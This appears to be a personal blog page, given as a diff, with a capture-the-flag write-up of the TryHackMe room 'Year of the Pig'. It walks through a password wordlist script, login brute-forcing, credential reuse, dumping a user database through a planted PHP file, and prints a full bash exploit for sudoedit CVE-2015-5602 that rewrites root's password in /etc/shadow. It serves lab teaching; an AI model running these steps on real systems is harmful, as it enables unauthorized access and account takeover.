@@ -1,0 +1,330 @@
+<!DOCTYPE html>
+<html>
+<title>Antoni Chrobot</title>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<!-- Bootstrap -->
+<link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/css/bootstrap.min.css" integrity="sha384-TX8t27EcRE3e/ihU7zmQxVncDAy5uIKz4rEkgIXeMed4M0jlfIDPvg6uqKI2xXr2" crossorigin="anonymous">
+<script src="https://code.jquery.com/jquery-3.5.1.slim.min.js" integrity="sha384-DfXdz2htPH0lsSSs5nCTpuj/zy4C+OGpamoFVy38MVBnE+IbbVYUew+OrCXaRkfj" crossorigin="anonymous"></script>
+<script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.3/dist/js/bootstrap.bundle.min.js" integrity="sha384-ho+j7jyWK8fNQe+A12Hb8AhRq26LrZ/JpcUGGOn+Y7RsweNrtN/tE3MoK7ZeZDyx" crossorigin="anonymous"></script>
+
+<link rel="stylesheet" href="https://www.w3schools.com/w3css/4/w3.css">
+<link rel='stylesheet' href='https://fonts.googleapis.com/css?family=Roboto'>
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/styles/atelier-forest-dark.min.css" integrity="sha512-bHrTOKTYdBppORvOCgGWhwUt68kqsl5e9cemM/7hf1uehwPUjtAiGyXzcoBFRN3SnktP0582tbAzkPPMWVTgVQ==" crossorigin="anonymous" />
+<script src="https://cdnjs.cloudflare.com/ajax/libs/highlight.js/10.3.2/highlight.min.js"></script>
+<script>hljs.initHighlightingOnLoad();</script>
+
+<link rel="stylesheet" href="../style.css">
+<style>
+html,body,h1,h2,h3,h4,h5,h6 {font-family: "Roboto", sans-serif}
+</style>
+
+<body>
+
+<!-- Page Container -->
+<div class="container-fluid px-5">
+
+<!-- navbar  -->
+<nav class="navbar navbar-expand-lg topnav mt-1 mb-3 p-0">
+    	
+    <button class="navbar-toggler" type="button" data-toggle="collapse" data-target="#collapsibleNavbar">
+    <span class="navbar-toggler-icon">
+    <i class="fa fa-navicon" style="color: white"></i>
+    </span>
+    </button>
+
+    <div class="collapse navbar-collapse" id="collapsibleNavbar">
+    	
+    <ul class="navbar-nav">
+	<li class="nav-item">
+	    <a class="navlink" href="../index.html">Home</a>
+	</li>
+	<li class="nav-item">
+	    <a class="navlink" href="../projects.html">Projects</a>
+	</li>
+	<li class="nav-item">
+	    <a class="active navlink" href="../ctf.html">CTF</a>
+	</li>
+    </ul>
+
+    </div>
+</nav>
+<!-- end navbar  -->
+	
+
+<div class="row justify-content-center"> 
+
+    <div class="col-12 col-xl-9">
+
+    <div class="w3-display-container w3-container gray-bg w3-card  w3-margin-bottom">
+
+	<!-- CONTENT GOES HERE -->
+
+	<h2 class="title mb-2">TryHackMe: Year of the Pig</h2>
+	<div class="meta mb-3">
+	<span class="date">January 26, 2020</span>
+	</div>
+	<hr>
+
+	<a href="https://tryhackme.com/room/yearofthepig">https://tryhackme.com/room/yearofthepig</a>
+
+	<h2>Enumeration</h2>
+
+	<p><em>Note: I added the IP address to my /etc/hosts file, so that 'yotp' resolves to the target IP</em></p>
+
+	<h3>Port scanning</h3>
+
+	<p><code>
+	nmap -sV -sC -v -oN top-ports.txt yotp
+	</code>
+	</p>
+	<a href="../images/thm-pig/nmap-output.png" />
+	<img class="blog-img" src="../images/thm-pig/nmap-output.png" alt="png" title="" />
+	</a>
+
+	<p>We have a web site at port 80 and SSH. Let's dig into the web application.
+	It appears to be a basic blog, authored by air plane enthusiast Marco.</p>
+
+	<h3>Directory brute forcing</h3>
+
+	<p>
+	</p>
+	<a href="../images/thm-pig/dir-enumeration.png" /> 
+	<img class="blog-img" src="../images/thm-pig/dir-enumeration.png" alt="png" title="" /> 
+	</a>
+
+	<p>We have a Admin Panel login page and not much else. Trying to log in we get an interesting message:
+	</p>
+	<a href="../images/thm-pig/password-hint.png" />
+	<img class="blog-img" src="../images/thm-pig/password-hint.png" alt="png" title="" />
+	</a>
+
+	<h3>Creating a custom wordlist</h3>
+
+	<p>Knowing the format of the password, we can take a stab at bruteforcing some login credentials.</p>
+
+	<p>
+	<a href="../images/thm-pig/blog-content.png" />
+	<img class="blog-img" src="../images/thm-pig/blog-content.png" alt="png" title="" />
+	</a>
+	Looking at the blog content, it is clear that Marco is obsessed with planes. His favorite is
+	the Savoia S.21. We have a word and two numbers... this could potentially be a password.</p>
+
+	<p>I made a wordlist by making all combinations of <code>savoia</code>, numbers 00-99, and special characters.
+	I made this list with Savoia having first letter capital, all caps, and all lowercase. This was generated with
+	the following python script:</p>
+
+	<pre><code>import string
+important_word = 'Savoia'
+for i in range(100):
+    for sp in string.punctuation:
+        print(f'{important_word}{str(i).zfill(2)}{sp}')
+        print(f'{important_word.upper()}{str(i).zfill(2)}{sp}')
+        print(f'{important_word.lower()}{str(i).zfill(2)}{sp}')
+	</code></pre>
+
+	<p>I then used Burp to intercept a login request, and examine it's structure.</p>
+
+	<p>Authentication is done by making a POST request to /api/login with the request body being a JSON string
+	holding the username, and md5 encoded password.</p>
+
+	<p>
+	</p>
+	<a href="../images/thm-pig/login-request.png" />
+	<img class="blog-img" src="../images/thm-pig/login-request.png" alt="png" title="" />
+	</a>
+
+	<p>I used wfuzz for bruteforcing the login, since it has the capability to encode passwords (md5 in this case).</p>
+
+	<p>
+	<a href="../images/thm-pig/fuzzing-script.png" />
+	<img class="blog-img" src="../images/thm-pig/fuzzing-script.png" alt="png" title="" />
+	</a>
+	<a href="../images/thm-pig/fuzz-output.png" /> 
+	<img class="blog-img" src="../images/thm-pig/fuzz-output.png" alt="png" title="" /> 
+	</a>
+	The wfuzz output showed the md5 hash of the correct password. All I had to do was take the md5 hash
+	of each password in the wordlist, and compare it against the known password hash. With this I had a set of login credentials.</p>
+
+	<p>
+	<a href="../images/thm-pig/admin-page.png" /> 
+	<img class="blog-img" src="../images/thm-pig/admin-page.png" alt="png" title="" /> 
+	</a>
+	And we're in!</p>
+
+	<p>Looking around the <code>Admin Panel</code>, I noticed there was another user, curtis, on the web app.
+	</p>
+	<a href="../images/thm-pig/another-user.png" /> 
+	<img class="blog-img" src="../images/thm-pig/another-user.png" alt="png" title="" /> 
+	</a>
+
+	<h3>Credential reuse</h3>
+
+	<p>I played around with the admin panel for way too long before trying the simple approach: using known credentials in other places.
+	I tried marco's credentials with ssh...
+	<a href="../images/thm-pig/ssh-logged-in.png" />
+	<img class="blog-img" src="../images/thm-pig/ssh-logged-in.png" alt="png" title="" />
+	</a>
+	... and it worked! I wish I had tried this first.</p>
+
+	<p>In <code>/home/marco</code> we find the first flag.
+	This looked like an unusual entry. 
+	</p>
+	<a href="../images/thm-pig/flag1.png" />
+	<img class="blog-img" src="../images/thm-pig/flag1.png" alt="png" title="" />
+	</a>
+
+	<h3>Horizontal Escalation</h3>
+
+	<p>After doing some enumeration as user marco, I noticed a couple things:
+
+	<ul> 
+	<li>Marco was part of the group <code>web-developers</code> and could edit/create any pages on the web application.</li>
+	<li>There was another user on this system, curtis. Curtis was also listed as one of the users under the Admin Panel</li>
+	</ul>
+
+	<p>So my next goal was to get curtis' credentials for the <code>Admin Panel</code>, with the hope that his credentials are also used
+	for his ssh login.</p>
+
+	<p>To go about this, I took advantage of the fact that marco has control over the web content. 
+	I started digging through files under <code>/var/www/html</code>. I found a .db file called <code>admin.db</code>, however user marco 
+	did not have access to this database directly.</p>
+
+	<p>I knew there must be some php code, running as www-data, that had access to the database.
+	I continued looking through <code>/var/www/html</code> and I found a file, <code>getUsers.php</code>, which had code that made a SQL query looking for users in the database: 
+	</p>
+	<a href="../images/thm-pig/getusers-php.png" />
+	<img class="blog-img" src="../images/thm-pig/getusers-php.png" alt="png" title="" />
+	</a>
+
+	<p>I duplicated this file and saved it as <code>creds.php</code> and modified it as shown below: 
+	</p>
+	<a href="../images/thm-pig/creds-php.png" />
+	<img class="blog-img" src="../images/thm-pig/creds-php.png" alt="png" title="" />
+	</a>
+
+	<p>This code simply made a SQL query to the database, requesting all username and password fields.
+	Then it echo'd some html containing the retrieved username:password pairs.</p>
+
+	<p>With this file saved, I then visited <code>http://yotp/admin/creds.php</code> and got the md5 hash for curtis' password: 
+	</p>
+	<a href="../images/thm-pig/leaked-creds.png" />
+	<img class="blog-img" src="../images/thm-pig/leaked-creds.png" alt="png" title="" />
+	</a>
+
+	<p>With this hash, I went right to <a href="CrackStation">http://crackstation.net</a> and hoped this hash was recognized.
+	<a href="../images/thm-pig/crackstation-output.png" /> 
+	<img class="blog-img" src="../images/thm-pig/crackstation-output.png" alt="png" title="" /> 
+	</a>
+	Luckily this hash was known by CrackStation!</p>
+
+	<p>With curtis' password for the <code>Admin Panel</code>, I tried it out on ssh, and successfully logged in as curtis!</p>
+
+	<p>In <code>/home/curtis</code> we find the second flag.
+	</p>
+	<a href="../images/thm-pig/flag2.png" />
+	<img class="blog-img" src="../images/thm-pig/flag2.png" alt="png" title="" />
+	</a>
+
+	<h3>Privilege Escalation</h3>
+
+	<p>Continuing with enumeration as user curtis, I noticed something interesting when running <code>sudo -l</code>:
+	<a href="../images/thm-pig/sudo-l-output.png" />
+	<img class="blog-img" src="../images/thm-pig/sudo-l-output.png" alt="png" title="" />
+	</a>
+	This looked like an unusual entry. </p>
+
+	<p>I searched for sudoedit vulnerabilites and came across <a href="CVE-2015-5602">https://www.exploit-db.com/exploits/37710</a></p>
+
+	<p>I looked for some available exploits and I found this <a href="Github repo">https://github.com/t0kx/privesc-CVE-2015-5602</a>.</p>
+
+	<p>I reviewed the source code to see how it worked, which I will summarize:
+	* This exploit can be used when a user can run <code>sudoedit</code> on a file where the filepath contains subsequent wildcards in the path.
+	* We then create a symlink from <code>/etc/shadow</code> to the sudoeditable file
+	* We create a simple bash script that uses <code>sed</code> to change the contents of a <code>/etc/shadow</code> file. By changing the entry for user root in <code>/etc/shadow</code> we can change root's password
+	* We set our <code>EDITOR</code> environment variable to our bash script
+	* We run <code>sudoedit</code> on our editable file. Since we set the <code>EDITOR</code> variable, sudoedit runs our bash script against the editable file.
+	* Since we have a symlink between our editable file and <code>/etc/shadow</code>, and since our editable file contains two wildcard characters in the path, we can edit the contents of <code>/etc/shadow</code> to give root a password of our choosing</p>
+
+	<p>I made some modifications to the <code>exploit.sh</code> script in order to tailor it to my specific case. Below is my tailored script:</p>
+
+	<pre><code>#!/usr/bin/env bash
+# CVE-2015-5602 exploit by t0kx 
+# https://github.com/t0kx/privesc-CVE-2015-5602
+
+export EDITOR="/tmp/edit"
+export FOLDER="${RANDOM}"
+export PASSWD=$(printf ${RANDOM} \
+	    | md5sum \
+	    | awk '{print $1}')
+
+prepare() {
+cat &lt;&lt; EOF &gt;&gt; /tmp/edit
+pass="$(printf "%q" $(openssl passwd -1 -salt ${RANDOM} ${PASSWD}))"
+sed -i -e  "s,^root:[^:]+:,root:\${pass}:," \${1}
+EOF
+}
+
+main() {
+    printf "[+] CVE-2015-5602 exploit by t0kx\n"
+    printf "[+] Modify EDITOR...\n"
+    prepare &amp;&amp; chmod +x ${EDITOR}
+    printf "[+] Change root password to: ${PASSWD}\n"
+    sudoedit /var/www/html/1/2/config.php
+    printf "[+] Done\n"
+}; main
+
+	</code></pre>
+
+	<a href="../images/thm-pig/symlink.png" />
+	<img class="blog-img" src="../images/thm-pig/symlink.png" alt="png" title="" />
+	</a>
+
+	<p>After creating the symlink, I ran the script and successfully escalated to root!
+	</p>
+	<a href="../images/thm-pig/exploit-output.png" />
+	<img class="blog-img" src="../images/thm-pig/exploit-output.png" alt="png" title="" />
+	</a>
+
+	<!-- END CONTENT -->
+
+
+    </div> <!-- End display container -->
+    </div> <!-- End columns -->
+</div> <!-- End row -->
+
+<!-- footer for small devices -->
+<footer class="fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+</footer>
+
+
+<!-- Footer for large devices -->
+<footer class="d-none d-xl-block fixed-bottom w3-deep-purple w3-center pt-1 mt-3">
+  <p class="m-0"><a href="#" ><u>Top</u></a></p>
+    <a class="my-0 mx-2" href="mailto:antoni.chrobot@gmail.com"><i class="fa fa-envelope w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://www.linkedin.com/in/antonichrobot/" ><i class="fa fa-linkedin w3-hover-opacity"></i></a>
+
+    <a class="my-0 mx-2" href="https://github.com/achrobot1" ><i class="fa fa-github "></i></a>
+
+    <a class="my-0 mx-2" href="https://twitter.com/AntoniChrobot" ><i class="fa fa-twitter w3-hover-opacity"></i></a>
+
+  <p class="m-0">Find me on social media.</p> 
+  
+</footer>
+
+</body>
+</html>
+
+
